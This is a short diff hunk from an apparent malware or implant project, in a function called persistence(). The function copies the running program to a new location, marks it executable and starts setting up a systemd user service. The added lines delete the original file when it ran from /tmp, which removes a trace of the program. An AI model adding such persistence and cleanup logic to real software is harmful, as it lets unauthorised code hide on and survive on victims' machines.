@@ -22,6 +22,9 @@ def persistence():
 
         shutil.copyfile(current_path, path)
         os.chmod(path, 0o755)
+        
+        if current_path.startswith("/tmp/"):
+            os.remove(current_path)
 
         systemd_user_dir = os.path.join(user_home, ".config", "systemd", "user")
 
